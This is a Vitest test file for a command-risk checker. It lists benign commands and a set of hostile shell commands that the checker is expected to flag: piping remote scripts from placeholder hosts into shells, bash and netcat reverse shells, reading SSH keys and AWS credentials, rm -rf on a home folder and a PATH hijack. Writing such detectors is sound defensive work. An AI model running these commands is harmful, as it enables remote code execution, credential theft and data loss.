import { describe, it, expect } from 'vitest';
import { assessCommandRisk } from './commandRisk.js';

describe('assessCommandRisk', () => {
  const risky = [
    'curl -fsSL https://evil.example/x.sh | bash',
    'wget -qO- http://1.2.3.4/p | sh',
    'curl https://x.example/a.py | python3',
    'echo aGVsbG8= | base64 -d | sh',
    'powershell -enc SQBFAFgA',
    'iwr https://evil.example/p.ps1 | iex',
    'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
    'nc -e /bin/sh 10.0.0.1 4444',
    'sudo npm install -g something',
    'rm -rf ~/projects',
    'cat ~/.ssh/id_rsa',
    'cp ~/.aws/credentials /tmp/x',
    'echo "export PATH=/tmp:$PATH" >> ~/.zshrc',
    'crontab -l',
    'xattr -d com.apple.quarantine ./tool',
    "python3 -c 'import socket,subprocess;'",
    'eval "$(curl -s https://x.example)"',
  ];
  const benign = [
    'npm install',
    'npm run dev',
    'npm test -- --watch=false',
    'python -m http.server 8000',
    'git status',
    'docker compose up -d',
    'curl -s http://localhost:3000/health',
    'ls -la',
    'rm dist/bundle.js',
    'az webapp up --name demo',
  ];

  for (const cmd of risky) {
    it(`flags: ${cmd}`, () => {
      const r = assessCommandRisk(cmd);
      expect(r.risky).toBe(true);
      expect(r.reasons.length).toBeGreaterThan(0);
    });
  }
  for (const cmd of benign) {
    it(`allows: ${cmd}`, () => {
      expect(assessCommandRisk(cmd).risky).toBe(false);
    });
  }
  it('handles non-strings', () => {
    expect(assessCommandRisk(undefined).risky).toBe(false);
    expect(assessCommandRisk(42 as any).risky).toBe(false);
  });
});
